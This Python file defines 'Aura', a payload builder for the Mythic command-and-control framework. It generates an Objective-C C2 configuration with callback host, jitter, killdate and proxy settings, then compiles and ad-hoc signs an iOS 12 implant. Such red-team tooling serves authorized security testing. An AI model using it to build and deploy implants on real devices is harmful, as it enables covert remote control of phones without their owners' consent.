from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import asyncio
import os
import subprocess
import pathlib


class Aura(PayloadType):
    name = "Aura"
    file_extension = ""
    author = "@brandon7CC"
    supported_os = [SupportedOS.IOS]
    wrapper = False
    wrapped_payloads = []
    note = """Objective-C payload supporting iOS 12."""
    supports_dynamic_loading = False
    c2_profiles = ["http"]
    mythic_encrypts = True
    translation_container = None
    build_parameters = []
    agent_path = pathlib.Path(".") / "aura"
    agent_icon_path = agent_path / "agent_functions" / "Microsoft_logo.svg"
    agent_code_path = agent_path / "agent_code"
    build_path = agent_path / "build"
    aura_payload_path = build_path / "aura_payload"

    build_steps = [
        BuildStep(step_name="Validating Build Settings", step_description="Making sure all commands have backing files on disk"),
        BuildStep(step_name="Configuring C2", step_description="Stamping in configuration values"),
        BuildStep(step_name="Compiling and Linking Objective-C", step_description="Compiling and linking the payload for iOS."),
        BuildStep(step_name="Signing entitlements", step_description="Signing entitlements to the payload."),
    ]

    sdk_path = "/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS.sdk"
    clang_compiler_path = "/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/clang"

    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Success)

        try:
            # If the payload already exists, then delete it
            if os.path.exists(self.aura_payload_path):
                os.remove(self.aura_payload_path)

            # Validate build settings
            await self._validate_build_settings()

            # C2 Profile Configuration
            params = self._extract_c2_parameters()
            await self._create_http_config(params)

            # Compilation
            os.makedirs(f"{self.build_path}", exist_ok=True)
            compile_link_cmd = self._generate_compile_command()
            print(f"\n{compile_link_cmd}\n")
            await self._run_command(compile_link_cmd, "Compiling and Linking Objective-C", resp)

            # Codesigning the base entitlements
            codesign_command = self._generate_codesign_command()
            await self._run_command(codesign_command, "Signing entitlements", resp)

            # If the payload was successfully built, read it into memory and attach it to the response
            if os.path.exists(self.aura_payload_path):
                resp.payload = open(self.aura_payload_path, "rb").read()

            resp.build_message = "🥳 Successfully built and signed Aura payload!"
            resp.status = BuildStatus.Success

        except Exception as e:
            resp.set_status(BuildStatus.Error)
            resp.build_message = f"Exception: {str(e)}"

        return resp

    async def _validate_build_settings(self):
        failed = False
        # Check if paths exist
        if not pathlib.Path(self.sdk_path).exists():
            failed = True
            await self._update_build_step("Validating Build Settings", f"Error: SDK path not found at {self.sdk_path}", False)
        
        # Check if clang compiler exists
        if not pathlib.Path(self.clang_compiler_path).exists():
            failed = True
            await self._update_build_step("Validating Build Settings", f"Error: Clang compiler not found at {self.clang_compiler_path}", False)
        
        if not failed:
            await self._update_build_step("Validating Build Settings", "Successfully gathered Aura sources", True)

    async def _update_build_step(self, step_name, step_stdout, step_success):
        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
            PayloadUUID=self.uuid,
            StepName=step_name,
            StepStdout=step_stdout,
            StepSuccess=step_success
        ))

    def _extract_c2_parameters(self):
        params = self.c2info[0].get_parameters_dict()
        print(f"\n\nPARAMS: {params}\n\n")
        return params

    async def _create_http_config(self, params):
        callback_host = params.get("callback_host", "localhost")
        callback_port = params.get("callback_port", 80)
        callback_interval = params.get("callback_interval", 10)
        callback_jitter = params.get("callback_jitter", 23)
        killdate = params.get("killdate", "2025-09-18")
        headers = params.get("headers", {})

        config_objc_code = f"""
#import "HTTPC2Config.h"

@implementation HTTPC2Config

+ (NSString *)AESPSKEncKey {{
    return @"";
}}

+ (NSString *)AESPSKDecKey {{
    return @"";
}}

+ (NSString *)AESPSKValue {{
    return @"";
}}

+ (NSString *)callbackHost {{
    return @"{callback_host}";
}}

+ (NSInteger)callbackPort {{
    return {callback_port};
}}

+ (NSInteger)callbackInterval {{
    return {callback_interval};
}}

+ (NSInteger)callbackJitter {{
    return {callback_jitter};
}}

+ (NSString *)killdate {{
    return @"{killdate}";
}}

+ (NSDictionary *)headers {{
    return @{{
        {"".join([f'@\"{k}\": @\"{v}\", ' for k, v in headers.items()])}
    }};
}}

+ (NSString *)payloadUUID {{
    return @"{self.uuid}";
}}

+ (BOOL)encryptedExchangeCheck {{
    return {str(params.get("encrypted_exchange_check", "NO")).lower()};
}}

+ (NSString *)getURI {{
    return @"{params.get("get_uri", "index")}";
}}

+ (NSString *)postURI {{
    return @"{params.get("post_uri", "agent_message")}";
}}

+ (NSString *)proxyHost {{
    return @"{params.get("proxy_host", "")}";
}}

+ (NSString *)proxyPass {{
    return @"{params.get("proxy_pass", "")}";
}}

+ (NSString *)proxyPort {{
    return @"{params.get("proxy_port", "")}";
}}

+ (NSString *)proxyUser {{
    return @"{params.get("proxy_user", "")}";
}}

+ (NSString *)queryPathName {{
    return @"{params.get("query_path_name", "query")}";
}}

@end
"""
        with open(f"{self.agent_code_path}/c2_profiles/HTTPC2Config.m", 'w') as objc_file:
            objc_file.write(config_objc_code)
        
        await self._update_build_step("Configuring C2", "Successfully stamped C2 config.", True)

    def _generate_compile_command(self):
        source_files = [
            "main.m",
            "C2CheckIn.m",
            "c2_profiles/HTTPC2Config.m",
            "SystemInfoHelper.m",
            "C2Task.m"
        ]

        source_file_paths = " ".join([f"{self.agent_code_path}/{src}" for src in source_files])
        objc_flags = "-x objective-c -fobjc-arc -std=gnu11"
        return (
            f"{self.clang_compiler_path} {objc_flags} "
            f"-target arm64-apple-ios12.0 -v "
            f"-isysroot {self.sdk_path} "
            f"-I {self.agent_code_path}/c2_profiles "
            f"{source_file_paths} "
            f"-framework Foundation -framework UIKit -lobjc "
            f"-o {self.aura_payload_path} "
        )

    def _generate_codesign_command(self):
        entitlements_file = self.agent_code_path / "base_entitlements.plist"
        return f"codesign -s - --entitlements {entitlements_file} --force --timestamp=none {self.aura_payload_path}"

    async def _run_command(self, command, step_name, resp):
        # Print the command being run for better logging
        print(f"\nRunning command for {step_name}:\n{command}\n")

        # Use subprocess to run the command and capture both stdout and stderr
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()

        # Log the output from the command
        if stdout:
            print(f"STDOUT from {step_name}: {stdout.decode()}")
        if stderr:
            print(f"STDERR from {step_name}: {stderr.decode()}")

        # If the command fails, capture and log the error
        if process.returncode != 0:
            error_message = f"Error during {step_name}:\n{stderr.decode()}"
            print(error_message)  # Print to console for additional logging
            await self._update_build_step(step_name, error_message, False)
            resp.set_status(BuildStatus.Error)
            resp.build_message = error_message
        else:
            success_message = f"Successfully completed {step_name}"
            print(success_message)  # Print success message to console
            await self._update_build_step(step_name, success_message, True)
